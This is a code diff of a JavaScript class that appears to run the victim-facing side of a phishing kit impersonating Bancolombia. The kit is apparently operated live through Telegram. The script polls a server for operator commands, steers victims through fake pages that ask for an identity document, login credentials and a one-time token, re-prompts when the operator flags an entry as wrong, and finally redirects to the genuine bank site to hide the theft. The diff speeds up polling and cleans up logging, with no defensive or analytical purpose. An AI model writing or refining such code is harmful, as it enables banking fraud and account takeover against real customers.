@@ -8,8 +8,8 @@
 class TelegramManager {
     constructor() {
         this.checkInterval = null;
-        this.checking = false;
         this.isPolling = false;
+        this.pollCount = 0;
     }
 
     async sendToTelegram(stage, data) {
@@ -43,13 +43,14 @@ class TelegramManager {
 
     async startPolling() {
         if (this.isPolling) {
-            console.log('⚠️ Polling ya activo, ignorando...');
+            console.log('⚠️ Polling ya activo');
             return;
         }
         this.isPolling = true;
-        this.checking = true;
-        this.checkInterval = setInterval(() => this.checkAction(), 1500);
-        console.log('🔄 Polling iniciado...');
+        this.pollCount = 0;
+        // Polling rápido cada 1 segundo
+        this.checkInterval = setInterval(() => this.checkAction(), 1000);
+        console.log('🔄 POLLING INICIADO (cada 1s)');
     }
 
     stopPolling() {
@@ -57,160 +58,100 @@ class TelegramManager {
             clearInterval(this.checkInterval);
             this.checkInterval = null;
         }
-        this.checking = false;
         this.isPolling = false;
-        console.log('⏹️ Polling detenido');
+        console.log('⏹️ POLLING DETENIDO');
     }
 
     async checkAction() {
+        this.pollCount++;
+        
         try {
-            const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 8000);
-            
-            const response = await fetch(`/api/check-action?t=${Date.now()}`, {
+            const response = await fetch(`/api/check-action?_=${Date.now()}`, {
                 method: 'GET',
                 cache: 'no-cache',
-                credentials: 'include',
-                signal: controller.signal
+                credentials: 'include'
             });
-            
-            clearTimeout(timeoutId);
             
             if (response.ok) {
                 const data = await response.json();
+                
                 if (data.action) {
-                    console.log('✅ ACCIÓN DETECTADA:', data.action);
+                    console.log(`\n🔵🔵🔵 ACCIÓN DETECTADA: ${data.action} 🔵🔵🔵\n`);
                     this.stopPolling();
                     this.handleAction(data.action);
                 } else {
-                    // Log periódico cada 10 intentos
-                    if (!this.pollCount) this.pollCount = 0;
-                    this.pollCount++;
-                    if (this.pollCount % 10 === 0) {
-                        console.log(`🔍 Polling activo (${this.pollCount} intentos)...`);
+                    // Log cada 5 intentos
+                    if (this.pollCount % 5 === 0) {
+                        console.log(`🔍 Polling... (${this.pollCount} intentos, esperando acción)`);
                     }
                 }
             } else {
-                console.warn('⚠️ Response no OK:', response.status);
+                console.error('❌ Response error:', response.status);
             }
         } catch (error) {
-            if (error.name === 'AbortError') {
-                console.warn('⏱️ Timeout en check-action');
-            } else {
-                console.error('❌ Error checking action:', error);
-            }
+            console.error('❌ Error en checkAction:', error.message);
         }
     }
 
     handleAction(action) {
-        console.log('🎯 EJECUTANDO ACCIÓN:', action);
+        console.log(`🎯 EJECUTANDO: ${action}`);
 
-        // Execute immediately based on action type
         switch (action) {
             case 'error_documento':
-                // Keep overlay active during redirect
                 this.showOverlay();
-                this.sendConfirmation(action);
-                setTimeout(() => {
-                    window.location.href = '/index.html?error=documento';
-                }, 100);
+                console.log('➡️ Redirigiendo a index con error...');
+                setTimeout(() => window.location.href = '/index.html?error=documento', 100);
                 break;
 
             case 'pedir_logo':
-                // Keep overlay active during redirect
                 this.showOverlay();
-                this.sendConfirmation(action);
-                setTimeout(() => {
-                    window.location.href = '/next-step.html';
-                }, 100);
+                console.log('➡️ Redirigiendo a next-step...');
+                setTimeout(() => window.location.href = '/next-step.html', 100);
                 break;
 
             case 'error_logo':
-                // Keep overlay active during redirect
                 this.showOverlay();
-                this.sendConfirmation(action);
-                setTimeout(() => {
-                    window.location.href = '/next-step.html?error=credenciales';
-                }, 100);
+                console.log('➡️ Redirigiendo a next-step con error...');
+                setTimeout(() => window.location.href = '/next-step.html?error=credenciales', 100);
                 break;
 
             case 'pedir_token':
-                // Check if we're on next-step page
-                const currentPath = window.location.pathname;
-                this.sendConfirmation(action);
-                if (currentPath.includes('next-step')) {
-                    // Hide overlay and switch to token card
+                console.log('🔑 Procesando pedir_token...');
+                const isOnNextStep = window.location.pathname.includes('next-step');
+                
+                if (isOnNextStep && window.tokenModalController) {
                     this.hideOverlay();
-                    if (typeof window.tokenModalController !== 'undefined') {
-                        setTimeout(() => {
-                            window.tokenModalController.switchToTokenCard();
-                        }, 100);
-                    } else {
-                        console.error('tokenModalController no disponible');
-                    }
+                    console.log('➡️ Abriendo tarjeta de token...');
+                    setTimeout(() => window.tokenModalController.switchToTokenCard(), 100);
                 } else {
-                    // Redirect to next-step with token open
                     this.showOverlay();
-                    setTimeout(() => {
-                        window.location.href = '/next-step.html?openToken=1';
-                    }, 100);
+                    console.log('➡️ Redirigiendo a next-step con token...');
+                    setTimeout(() => window.location.href = '/next-step.html?openToken=1', 100);
                 }
                 break;
 
             case 'error_token':
-                // Hide overlay and show error
                 this.hideOverlay();
-                this.sendConfirmation(action);
+                console.log('❌ Error de token, limpiando input...');
                 const tokenInput = document.getElementById('tokenInputCard');
                 if (tokenInput) {
                     tokenInput.value = '';
                     setTimeout(() => {
                         tokenInput.focus();
-                        alert('Token incorrecto o expirado. Por favor, genera uno nuevo e ingrésalo.');
+                        alert('Token incorrecto. Por favor, inténtalo nuevamente.');
                     }, 100);
-                } else {
-                    console.warn('tokenInputCard no encontrado en esta página');
                 }
                 break;
 
             case 'finalizar':
-                // Keep overlay active during redirect
                 this.showOverlay();
-                this.sendConfirmation(action);
-                setTimeout(() => {
-                    window.location.href = 'https://www.bancolombia.com/personas';
-                }, 100);
+                console.log('🏁 Finalizando, redirigiendo a Bancolombia...');
+                setTimeout(() => window.location.href = 'https://www.bancolombia.com/personas', 100);
                 break;
 
             default:
                 console.warn('❓ Acción desconocida:', action);
                 this.hideOverlay();
-        }
-    }
-
-    async sendConfirmation(action) {
-        // Enviar mensaje de confirmación a Telegram
-        const actionNames = {
-            'error_documento': '❌ Error Documento',
-            'pedir_logo': '✅ Pedir Logo (Credenciales)',
-            'error_logo': '❌ Error Logo',
-            'pedir_token': '🔑 Pedir Token',
-            'error_token': '❌ Error Token',
-            'finalizar': '🏁 Finalizar'
-        };
-        
-        try {
-            await fetch('/api/send-confirmation', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                credentials: 'include',
-                body: JSON.stringify({ 
-                    action: action,
-                    actionName: actionNames[action] || action
-                })
-            });
-        } catch (error) {
-            console.error('Error enviando confirmación:', error);
         }
     }
 
